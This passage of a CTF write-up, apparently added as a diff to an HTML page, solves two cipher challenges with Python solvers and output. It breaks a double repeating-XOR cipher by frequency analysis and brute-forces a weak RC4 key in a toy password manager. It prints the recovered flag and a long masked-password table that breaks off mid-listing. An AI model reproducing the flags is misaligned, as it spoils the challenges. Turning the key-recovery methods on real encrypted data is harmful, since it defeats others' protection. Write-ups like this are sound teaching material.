+  The two keys appear to be of length 21 and 19 <br />
+  The value of each character in these keys does not exceed 255 <br />
+  Find these two keys for me; concatenate their ASCII encodings and wrap it in the flag format.  </p>
+</blockquote>
+
+<p>This challenge is very fun, at its finest it is just combination of pseudo-key and itsy-bitsy, basically, every 399th character will be xored by the same key (21*19), the first information basically says the space character is 481, and space character is the most common character in a text. So, we for example, if we want to find <code>481^key1[0]^key2[0]</code>, we can check every 399th characters, and look at the most common number , that number xored by 481 is <code>key1^key2</code>:</p>
+
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">collections</span>
+<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;encrypted.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="n">i</span><span class="o">=</span><span class="mi">0</span>
+<span class="n">j</span><span class="o">=</span><span class="mi">0</span>
+<span class="n">tries</span><span class="o">=</span><span class="mi">0</span>
+<span class="k">for</span> <span class="n">pos1</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">21</span><span class="p">):</span>
+    <span class="nb">print</span> <span class="p">(</span><span class="s2">&quot;----------&quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">pos1</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;------------&quot;</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">pos2</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">19</span><span class="p">):</span>
+        <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="n">tries</span><span class="o">=</span><span class="mi">0</span>
+        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">i</span><span class="o">==</span><span class="n">pos1</span> <span class="ow">and</span> <span class="n">j</span><span class="o">==</span><span class="n">pos2</span><span class="p">:</span>
+                <span class="c1"># print pos2</span>
+                <span class="n">x</span> <span class="o">=</span> <span class="n">f</span><span class="p">[</span><span class="n">tries</span><span class="p">::</span><span class="mi">399</span><span class="p">]</span>
+                <span class="nb">print</span><span class="p">(</span><span class="n">collections</span><span class="o">.</span><span class="n">Counter</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">.</span><span class="n">most_common</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+                <span class="c1"># print tries</span>
+                <span class="k">break</span>
+            <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+            <span class="n">i</span><span class="o">=</span><span class="n">i</span><span class="o">%</span><span class="mi">21</span>
+            <span class="n">j</span> <span class="o">+=</span> <span class="mi">1</span>
+            <span class="n">j</span><span class="o">=</span><span class="n">j</span><span class="o">%</span><span class="mi">19</span>
+            <span class="n">tries</span><span class="o">+=</span><span class="mi">1</span>
+</code></pre></div>
+
+<p>the output will look something like this : </p>
+
+<pre><code>----------0------------
+('470', 250)
+('509', 301)
+('481', 272)
+('442', 279)
+('470', 241)
+('444', 274)
+('442', 234)
+('490', 254)
+('441', 245)
+('487', 265)
+('493', 252)
+('470', 264)
+('440', 244)
+('444', 233)
+('470', 267)
+('509', 279)
+('481', 240)
+('440', 253)
+('444', 271)
+----------1------------
+('397', 252)
+('422', 246)
+('442', 220)
+('481', 232)
+('397', 262)
+('487', 260)
+('481', 257)
+('433', 264)
+('482', 257)
+('444', 264)
+('438', 240)
+('397', 260)
+('483', 263)
+('487', 271)
+('397', 264)
+('422', 273)
+('442', 242)
+('483', 248)
+('487', 245)
+</code></pre>
+
+<p>as you can see <code>481^key1[0]^key2[0]</code> has the same value as <code>481^key1[0]^key2[4]</code>, you can also see <code>481^key1[1]^key2[0]</code> is the same as <code>481^key1[1]^key2[4]</code>, that means our plan is working fine. <br />
+the next thing we gonna do is to bruteforce to get the key, for example the first 19 lines contains <code>key1[0]^key2[0</code> to <code>key1[0]^key2[18]</code>, so if we can guess <code>key1[0]</code> correctly, we can recover the whole key2.  </p>
+
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">string</span> <span class="kn">import</span> <span class="n">printable</span>
+<span class="n">printable</span> <span class="o">=</span> <span class="n">printable</span><span class="p">[:</span><span class="o">-</span><span class="mi">5</span><span class="p">]</span>
+<span class="n">key2_enc</span> <span class="o">=</span> <span class="p">[</span><span class="mi">470</span><span class="p">,</span><span class="mi">509</span><span class="p">,</span><span class="mi">481</span><span class="p">,</span><span class="mi">442</span><span class="p">,</span><span class="mi">470</span><span class="p">,</span><span class="mi">444</span><span class="p">,</span><span class="mi">442</span><span class="p">,</span><span class="mi">490</span><span class="p">,</span><span class="mi">441</span><span class="p">,</span><span class="mi">487</span><span class="p">,</span><span class="mi">493</span><span class="p">,</span><span class="mi">470</span><span class="p">,</span><span class="mi">440</span><span class="p">,</span><span class="mi">444</span><span class="p">,</span><span class="mi">470</span><span class="p">,</span><span class="mi">509</span><span class="p">,</span><span class="mi">481</span><span class="p">,</span><span class="mi">440</span><span class="p">,</span><span class="mi">444</span><span class="p">]</span>
+<span class="n">key2</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">printable</span><span class="p">:</span>
+    <span class="n">key2</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">key2_enc</span><span class="p">:</span>
+        <span class="n">key2</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">481</span><span class="o">^</span><span class="n">j</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+    <span class="nb">print</span> <span class="p">(</span><span class="n">key2</span><span class="p">)</span>
+</code></pre></div>
+
+<p>We can see that there is one line that is an english leet text. which is <code>_th3_53c0nd_15_th15</code>, this is it, this must be a key2. next step is we basically do the same thing but this time to recover key1 and we don't need to bruteforce anymore, we just use the first character of key2 which is <code>_</code>.  </p>
+
+<div class="codehilite"><pre><span></span><code><span class="n">key1_enc</span> <span class="o">=</span> <span class="p">[</span><span class="mi">470</span><span class="p">,</span><span class="mi">397</span><span class="p">,</span><span class="mi">460</span><span class="p">,</span><span class="mi">397</span><span class="p">,</span><span class="mi">409</span><span class="p">,</span><span class="mi">395</span><span class="p">,</span><span class="mi">481</span><span class="p">,</span><span class="mi">458</span><span class="p">,</span><span class="mi">470</span><span class="p">,</span><span class="mi">397</span><span class="p">,</span><span class="mi">481</span><span class="p">,</span><span class="mi">472</span><span class="p">,</span><span class="mi">399</span><span class="p">,</span><span class="mi">460</span><span class="p">,</span><span class="mi">395</span><span class="p">,</span><span class="mi">458</span><span class="p">,</span><span class="mi">481</span><span class="p">,</span><span class="mi">470</span><span class="p">,</span><span class="mi">394</span><span class="p">,</span><span class="mi">466</span><span class="p">,</span><span class="mi">472</span><span class="p">]</span>
+<span class="n">key2</span> <span class="o">=</span> <span class="s2">&quot;_th3_53c0nd_15_th15&quot;</span>
+<span class="n">key1</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">j</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">key1_enc</span><span class="p">,</span><span class="s2">&quot;_&quot;</span><span class="o">*</span><span class="mi">21</span><span class="p">):</span>
+    <span class="n">key1</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">481</span><span class="o">^</span><span class="n">i</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="n">j</span><span class="p">))</span>
+<span class="nb">print</span> <span class="p">(</span><span class="s2">&quot;flag{&quot;</span> <span class="o">+</span> <span class="n">key1</span> <span class="o">+</span> <span class="n">key2</span> <span class="o">+</span> <span class="s1">&#39;}&#39;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>flag : <code>flag{h3r3'5_th3_f1r5t_h4lf_th3_53c0nd_15_th15}</code>  </p>
+
+<h1>worst-pw-manager</h1>
+
+<blockquote>
+  <p>I found this in-progress password manager on a dead company's website. Seems neat. <br />
+  When we look at the masked<em>file</em>name, what the code does is actually rotate each character from password by its position. So we can recover the password already by rotating it back, however this will not help us get the flag yet.  </p>
+</blockquote>
+
+<p>The next step is to take a look at the generate<em>key() function, the flag is cycled, so it was basically an endless string with the flag over and over again, the generate</em>key() function take every 8th character and make that the whole key. so if the 8th character from the flag is "a", that means the key will be [61,61,61,61,61,61,61,61] which is a hex representation of 'a'. <br />
+We don't even need to analyze the rc4() function, because we have the password and it's ciphertext, we can just bruteforce the key.  </p>
+
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">string</span> <span class="kn">import</span> <span class="n">printable</span><span class="p">,</span><span class="n">ascii_lowercase</span>
+
+<span class="k">class</span> <span class="nc">KeyByteHolder</span><span class="p">():</span> <span class="c1"># im paid by LoC, excuse the enterprise level code</span>
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">num</span><span class="p">):</span>
+        <span class="k">assert</span> <span class="n">num</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">num</span> <span class="o">&lt;</span> <span class="mi">256</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">num</span> <span class="o">=</span> <span class="n">num</span>
+    <span class="k">def</span> <span class="fm">__repr__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="nb">hex</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">num</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span>
+
+<span class="k">def</span> <span class="nf">rc4</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span> <span class="c1"># definitely not stolen from stackoverflow</span>
+    <span class="n">S</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">)]</span>
+    <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">out</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
+    <span class="c1">#KSA Phase</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
+        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]</span><span class="o">.</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span>
+        <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">,</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="p">,</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+    <span class="c1">#PRGA Phase</span>
+    <span class="n">i</span> <span class="o">=</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
+        <span class="n">i</span> <span class="o">=</span> <span class="p">(</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span> <span class="p">)</span> <span class="o">%</span> <span class="mi">256</span>
+        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span> <span class="n">j</span> <span class="o">+</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span> <span class="o">%</span> <span class="mi">256</span>
+        <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">,</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="p">,</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+        <span class="n">out</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">^</span> <span class="n">S</span><span class="p">[(</span><span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">])</span>
+    <span class="k">return</span> <span class="n">out</span>
+
+    <span class="k">return</span> <span class="p">[</span><span class="nb">next</span><span class="p">(</span><span class="n">iterator</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">count</span><span class="p">)]</span>
+
+<span class="k">def</span> <span class="nf">generate_key</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
+    <span class="n">key</span> <span class="o">=</span> <span class="p">[</span><span class="n">KeyByteHolder</span><span class="p">(</span><span class="mi">0</span><span class="p">)]</span> <span class="o">*</span> <span class="mi">8</span> <span class="c1"># TODO: increase key length for more security?</span>
+    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span> <span class="c1"># use top secret master password to encrypt all passwords</span>
+        <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">num</span> <span class="o">=</span> <span class="n">c</span>
+    <span class="k">return</span> <span class="n">key</span>
+
+<span class="n">password_masked</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;0&quot;</span> <span class="p">:</span> <span class="s2">&quot;135791&quot;</span><span class="p">,</span><span class="s2">&quot;151&quot;</span> <span class="p">:</span> <span class="s2">&quot;tfsxmjxv&quot;</span><span class="p">,</span><span class="s2">&quot;203&quot;</span> <span class="p">:</span> <span class="s2">&quot;mbtle&quot;</span><span class="p">,</span><span class="s2">&quot;256&quot;</span> <span class="p">:</span> <span class="s2">&quot;aoihpt&quot;</span><span class="p">,</span><span class="s2">&quot;309&quot;</span> <span class="p">:</span> <span class="s2">&quot;jbpxewe&quot;</span><span class="p">,</span><span class="s2">&quot;361&quot;</span> <span class="p">:</span> <span class="s2">&quot;abnlcfn&quot;</span><span class="p">,</span>
+<span class="s2">&quot;100&quot;</span> <span class="p">:</span> <span class="s2">&quot;amgaesjyi&quot;</span><span class="p">,</span><span class="s2">&quot;152&quot;</span> <span class="p">:</span> <span class="s2">&quot;7890123&quot;</span><span class="p">,</span><span class="s2">&quot;204&quot;</span> <span class="p">:</span> <span class="s2">&quot;gbdumjrh&quot;</span><span class="p">,</span><span class="s2">&quot;257&quot;</span> <span class="p">:</span> <span class="s2">&quot;kfpqiyn&quot;</span><span class="p">,</span><span class="s2">&quot;30&quot;</span> <span class="p">:</span> <span class="s2">&quot;fskhriy&quot;</span><span class="p">,</span><span class="s2">&quot;362&quot;</span> <span class="p">:</span> <span class="s2">&quot;ppqnmj&quot;</span><span class="p">,</span>
+<span class="s2">&quot;101&quot;</span> <span class="p">:</span> <span class="s2">&quot;amgamx&quot;</span><span class="p">,</span><span class="s2">&quot;153&quot;</span> <span class="p">:</span> <span class="s2">&quot;cighwj&quot;</span><span class="p">,</span><span class="s2">&quot;205&quot;</span> <span class="p">:</span> <span class="s2">&quot;imqyidub0&quot;</span><span class="p">,</span><span class="s2">&quot;258&quot;</span> <span class="p">:</span> <span class="s2">&quot;mbuwiw&quot;</span><span class="p">,</span><span class="s2">&quot;310&quot;</span> <span class="p">:</span> <span class="s2">&quot;fvenskl&quot;</span><span class="p">,</span><span class="s2">&quot;363&quot;</span> <span class="p">:</span> <span class="s2">&quot;jpjqgjth&quot;</span><span class="p">,</span>
+<span class="s2">&quot;102&quot;</span> <span class="p">:</span> <span class="s2">&quot;jfuxw&quot;</span><span class="p">,</span><span class="s2">&quot;154&quot;</span> <span class="p">:</span> <span class="s2">&quot;161098&quot;</span><span class="p">,</span><span class="s2">&quot;206&quot;</span> <span class="p">:</span> <span class="s2">&quot;bbkoid&quot;</span><span class="p">,</span><span class="s2">&quot;259&quot;</span> <span class="p">:</span> <span class="s2">&quot;sdqrfd&quot;</span><span class="p">,</span><span class="s2">&quot;311&quot;</span> <span class="p">:</span> <span class="s2">&quot;amkfmf&quot;</span><span class="p">,</span><span class="s2">&quot;364&quot;</span> <span class="p">:</span> <span class="s2">&quot;lpxhptbl&quot;</span><span class="p">,</span>
+<span class="s2">&quot;103&quot;</span> <span class="p">:</span> <span class="s2">&quot;etvuiqrh&quot;</span><span class="p">,</span><span class="s2">&quot;155&quot;</span> <span class="p">:</span> <span class="s2">&quot;asuhrfr&quot;</span><span class="p">,</span><span class="s2">&quot;207&quot;</span> <span class="p">:</span> <span class="s2">&quot;jfthqd&quot;</span><span class="p">,</span><span class="s2">&quot;25&quot;</span> <span class="p">:</span> <span class="s2">&quot;svpvlntl&quot;</span><span class="p">,</span><span class="s2">&quot;312&quot;</span> <span class="p">:</span> <span class="s2">&quot;njeksqgz&quot;</span><span class="p">,</span><span class="s2">&quot;365&quot;</span> <span class="p">:</span> <span class="s2">&quot;fveniw&quot;</span><span class="p">,</span>
+<span class="s2">&quot;104&quot;</span> <span class="p">:</span> <span class="s2">&quot;mjixiq&quot;</span><span class="p">,</span><span class="s2">&quot;156&quot;</span> <span class="p">:</span> <span class="s2">&quot;dpnslnt&quot;</span><span class="p">,</span><span class="s2">&quot;208&quot;</span> <span class="p">:</span> <span class="s2">&quot;pbohpf&quot;</span><span class="p">,</span><span class="s2">&quot;260&quot;</span> <span class="p">:</span> <span class="s2">&quot;cbtpis&quot;</span><span class="p">,</span><span class="s2">&quot;313&quot;</span> <span class="p">:</span> <span class="s2">&quot;fmqziwy&quot;</span><span class="p">,</span><span class="s2">&quot;366&quot;</span> <span class="p">:</span> <span class="s2">&quot;acegik&quot;</span><span class="p">,</span>
+<span class="s2">&quot;105&quot;</span> <span class="p">:</span> <span class="s2">&quot;wjnomfs&quot;</span><span class="p">,</span><span class="s2">&quot;157&quot;</span> <span class="p">:</span> <span class="s2">&quot;aovrrnu&quot;</span><span class="p">,</span><span class="s2">&quot;209&quot;</span> <span class="p">:</span> <span class="s2">&quot;kjoeiwrf&quot;</span><span class="p">,</span><span class="s2">&quot;261&quot;</span> <span class="p">:</span> <span class="s2">&quot;468024&quot;</span><span class="p">,</span><span class="s2">&quot;314&quot;</span> <span class="p">:</span> <span class="s2">&quot;cskvxngu&quot;</span><span class="p">,</span><span class="s2">&quot;367&quot;</span> <span class="p">:</span> <span class="s2">&quot;bfpmerou&quot;</span><span class="p">,</span>
+<span class="s2">&quot;106&quot;</span> <span class="p">:</span> <span class="s2">&quot;tiqpex&quot;</span><span class="p">,</span><span class="s2">&quot;158&quot;</span> <span class="p">:</span> <span class="s2">&quot;hfcwljx&quot;</span><span class="p">,</span><span class="s2">&quot;210&quot;</span> <span class="p">:</span> <span class="s2">&quot;gfolrn&quot;</span><span class="p">,</span><span class="s2">&quot;262&quot;</span> <span class="p">:</span> <span class="s2">&quot;sfddwyohv&quot;</span><span class="p">,</span><span class="s2">&quot;315&quot;</span> <span class="p">:</span> <span class="s2">&quot;tjpwms&quot;</span><span class="p">,</span><span class="s2">&quot;368&quot;</span> <span class="p">:</span> <span class="s2">&quot;143658&quot;</span><span class="p">,</span>
+<span class="s2">&quot;107&quot;</span> <span class="p">:</span> <span class="s2">&quot;bfcxxnlbt&quot;</span><span class="p">,</span><span class="s2">&quot;159&quot;</span> <span class="p">:</span> <span class="s2">&quot;dbxlh&quot;</span><span class="p">,</span><span class="s2">&quot;211&quot;</span> <span class="p">:</span> <span class="s2">&quot;sicqrtt&quot;</span><span class="p">,</span><span class="s2">&quot;263&quot;</span> <span class="p">:</span> <span class="s2">&quot;rfdhghg&quot;</span><span class="p">,</span><span class="s2">&quot;316&quot;</span> <span class="p">:</span> <span class="s2">&quot;bjcqgf&quot;</span><span class="p">,</span><span class="s2">&quot;369&quot;</span> <span class="p">:</span> <span class="s2">&quot;gbpjwyg&quot;</span><span class="p">,</span>
+<span class="s2">&quot;108&quot;</span> <span class="p">:</span> <span class="s2">&quot;mznrzj&quot;</span><span class="p">,</span><span class="s2">&quot;15&quot;</span> <span class="p">:</span> <span class="s2">&quot;jfuvmhg&quot;</span><span class="p">,</span><span class="s2">&quot;212&quot;</span> <span class="p">:</span> <span class="s2">&quot;pjewywkz&quot;</span><span class="p">,</span><span class="s2">&quot;264&quot;</span> <span class="p">:</span> <span class="s2">&quot;jbenmj&quot;</span><span class="p">,</span><span class="s2">&quot;317&quot;</span> <span class="p">:</span> <span class="s2">&quot;citlwgxvew&quot;</span><span class="p">,</span><span class="s2">&quot;36&quot;</span> <span class="p">:</span> <span class="s2">&quot;jvuwms&quot;</span><span class="p">,</span>
+<span class="s2">&quot;109&quot;</span> <span class="p">:</span> <span class="s2">&quot;aoihpf&quot;</span><span class="p">,</span><span class="s2">&quot;160&quot;</span> <span class="p">:</span> <span class="s2">&quot;gjpjiw&quot;</span><span class="p">,</span><span class="s2">&quot;2&quot;</span> <span class="p">:</span> <span class="s2">&quot;135791357&quot;</span><span class="p">,</span><span class="s2">&quot;265&quot;</span> <span class="p">:</span> <span class="s2">&quot;sqkgiwshv&quot;</span><span class="p">,</span><span class="s2">&quot;318&quot;</span> <span class="p">:</span> <span class="s2">&quot;cigvxjx&quot;</span><span class="p">,</span><span class="s2">&quot;370&quot;</span> <span class="p">:</span> <span class="s2">&quot;bsqroj&quot;</span><span class="p">,</span>
+<span class="s2">&quot;10&quot;</span> <span class="p">:</span> <span class="s2">&quot;njerpj&quot;</span><span class="p">,</span><span class="s2">&quot;161&quot;</span> <span class="p">:</span> <span class="s2">&quot;sugslftpm&quot;</span><span class="p">,</span><span class="s2">&quot;213&quot;</span> <span class="p">:</span> <span class="s2">&quot;atuksqk&quot;</span><span class="p">,</span><span class="s2">&quot;266&quot;</span> <span class="p">:</span> <span class="s2">&quot;citlwyuwpnb&quot;</span><span class="p">,</span><span class="s2">&quot;319&quot;</span> <span class="p">:</span> <span class="s2">&quot;113355&quot;</span><span class="p">,</span><span class="s2">&quot;371&quot;</span> <span class="p">:</span> <span class="s2">&quot;345678&quot;</span><span class="p">,</span>
+<span class="s2">&quot;110&quot;</span> <span class="p">:</span> <span class="s2">&quot;ppqkfjgy&quot;</span><span class="p">,</span><span class="s2">&quot;162&quot;</span> <span class="p">:</span> <span class="s2">&quot;pfcqyy&quot;</span><span class="p">,</span><span class="s2">&quot;214&quot;</span> <span class="p">:</span> <span class="s2">&quot;sprkmj&quot;</span><span class="p">,</span><span class="s2">&quot;267&quot;</span> <span class="p">:</span> <span class="s2">&quot;kbtlrf&quot;</span><span class="p">,</span><span class="s2">&quot;31&quot;</span> <span class="p">:</span> <span class="s2">&quot;bvvwiwlsg&quot;</span><span class="p">,</span><span class="s2">&quot;372&quot;</span> <span class="p">:</span> <span class="s2">&quot;hjrksu&quot;</span><span class="p">,</span>
+<span class="s2">&quot;111&quot;</span> <span class="p">:</span> <span class="s2">&quot;pbvumhq&quot;</span><span class="p">,</span><span class="s2">&quot;163&quot;</span> <span class="p">:</span> <span class="s2">&quot;bmkqo649&quot;</span><span class="p">,</span><span class="s2">&quot;215&quot;</span> <span class="p">:</span> <span class="s2">&quot;jfuvmj&quot;</span><span class="p">,</span><span class="s2">&quot;268&quot;</span> <span class="p">:</span> <span class="s2">&quot;jpjqrd&quot;</span><span class="p">,</span><span class="s2">&quot;320&quot;</span> <span class="p">:</span> <span class="s2">&quot;snqnid&quot;</span><span class="p">,</span><span class="s2">&quot;373&quot;</span> <span class="p">:</span> <span class="s2">&quot;abcdef&quot;</span><span class="p">,</span>
+<span class="s2">&quot;112&quot;</span> <span class="p">:</span> <span class="s2">&quot;imqyirk&quot;</span><span class="p">,</span><span class="s2">&quot;164&quot;</span> <span class="p">:</span> <span class="s2">&quot;sxghxnk&quot;</span><span class="p">,</span><span class="s2">&quot;216&quot;</span> <span class="p">:</span> <span class="s2">&quot;hfnospoabh&quot;</span><span class="p">,</span><span class="s2">&quot;269&quot;</span> <span class="p">:</span> <span class="s2">&quot;hpvpenr&quot;</span><span class="p">,</span><span class="s2">&quot;321&quot;</span> <span class="p">:</span> <span class="s2">&quot;sjnyiw&quot;</span><span class="p">,</span><span class="s2">&quot;374&quot;</span> <span class="p">:</span> <span class="s2">&quot;mzddfd&quot;</span><span class="p">,</span>
+<span class="s2">&quot;1&quot;</span> <span class="p">:</span> <span class="s2">&quot;13579&quot;</span><span class="p">,</span><span class="s2">&quot;165&quot;</span> <span class="p">:</span> <span class="s2">&quot;234567&quot;</span><span class="p">,</span><span class="s2">&quot;217&quot;</span> <span class="p">:</span> <span class="s2">&quot;cmcxhng&quot;</span><span class="p">,</span><span class="s2">&quot;26&quot;</span> <span class="p">:</span> <span class="s2">&quot;ciqfsqgam&quot;</span><span class="p">,</span><span class="s2">&quot;322&quot;</span> <span class="p">:</span> <span class="s2">&quot;iovhvska&quot;</span><span class="p">,</span><span class="s2">&quot;375&quot;</span> <span class="p">:</span> <span class="s2">&quot;sftjmt&quot;</span><span class="p">,</span>
+<span class="s2">&quot;113&quot;</span> <span class="p">:</span> <span class="s2">&quot;sbmxvf&quot;</span><span class="p">,</span><span class="s2">&quot;16&quot;</span> <span class="p">:</span> <span class="s2">&quot;666666&quot;</span><span class="p">,</span><span class="s2">&quot;218&quot;</span> <span class="p">:</span> <span class="s2">&quot;bbdbknxs9&quot;</span><span class="p">,</span><span class="s2">&quot;270&quot;</span> <span class="p">:</span> <span class="s2">&quot;0246802468&quot;</span><span class="p">,</span><span class="s2">&quot;323&quot;</span> <span class="p">:</span> <span class="s2">&quot;sxghx&quot;</span><span class="p">,</span><span class="s2">&quot;376&quot;</span> <span class="p">:</span> <span class="s2">&quot;wfnfsrk&quot;</span><span class="p">,</span>
+<span class="s2">&quot;114&quot;</span> <span class="p">:</span> <span class="s2">&quot;aetles&quot;</span><span class="p">,</span><span class="s2">&quot;166&quot;</span> <span class="p">:</span> <span class="s2">&quot;bfcxxd&quot;</span><span class="p">,</span><span class="s2">&quot;219&quot;</span> <span class="p">:</span> <span class="s2">&quot;aoihpnih&quot;</span><span class="p">,</span><span class="s2">&quot;271&quot;</span> <span class="p">:</span> <span class="s2">&quot;sdjrsq&quot;</span><span class="p">,</span><span class="s2">&quot;324&quot;</span> <span class="p">:</span> <span class="s2">&quot;sutdagkyzh&quot;</span><span class="p">,</span><span class="s2">&quot;377&quot;</span> <span class="p">:</span> <span class="s2">&quot;mfvdpqoji&quot;</span><span class="p">,</span>
+<span class="s2">&quot;115&quot;</span> <span class="p">:</span> <span class="s2">&quot;amgaesjlz&quot;</span><span class="p">,</span><span class="s2">&quot;167&quot;</span> <span class="p">:</span> <span class="s2">&quot;999999&quot;</span><span class="p">,</span><span class="s2">&quot;21&quot;</span> <span class="p">:</span> <span class="s2">&quot;imqyiz&quot;</span><span class="p">,</span><span class="s2">&quot;272&quot;</span> <span class="p">:</span> <span class="s2">&quot;bbtfiquui&quot;</span><span class="p">,</span><span class="s2">&quot;325&quot;</span> <span class="p">:</span> <span class="s2">&quot;gbtimjrk&quot;</span><span class="p">,</span><span class="s2">&quot;378&quot;</span> <span class="p">:</span> <span class="s2">&quot;jvnles&quot;</span><span class="p">,</span>
+<span class="s2">&quot;116&quot;</span> <span class="p">:</span> <span class="s2">&quot;dfuwmse&quot;</span><span class="p">,</span><span class="s2">&quot;168&quot;</span> <span class="p">:</span> <span class="s2">&quot;vjewswoh&quot;</span><span class="p">,</span><span class="s2">&quot;22&quot;</span> <span class="p">:</span> <span class="s2">&quot;012345&quot;</span><span class="p">,</span><span class="s2">&quot;273&quot;</span> <span class="p">:</span> <span class="s2">&quot;avixwy&quot;</span><span class="p">,</span><span class="s2">&quot;326&quot;</span> <span class="p">:</span> <span class="s2">&quot;dfpqmx&quot;</span><span class="p">,</span><span class="s2">&quot;379&quot;</span> <span class="p">:</span> <span class="s2">&quot;tscymx&quot;</span><span class="p">,</span>
+<span class="s2">&quot;117&quot;</span> <span class="p">:</span> <span class="s2">&quot;citlwyohv&quot;</span><span class="p">,</span><span class="s2">&quot;169&quot;</span> <span class="p">:</span> <span class="s2">&quot;hpphc&quot;</span><span class="p">,</span><span class="s2">&quot;220&quot;</span> <span class="p">:</span> <span class="s2">&quot;avuwms&quot;</span><span class="p">,</span><span class="s2">&quot;274&quot;</span> <span class="p">:</span> <span class="s2">&quot;osndriu&quot;</span><span class="p">,</span><span class="s2">&quot;327&quot;</span> <span class="p">:</span> <span class="s2">&quot;pbpjiy&quot;</span><span class="p">,</span><span class="s2">&quot;37&quot;</span> <span class="p">:</span> <span class="s2">&quot;lpxhqj&quot;</span><span class="p">,</span>
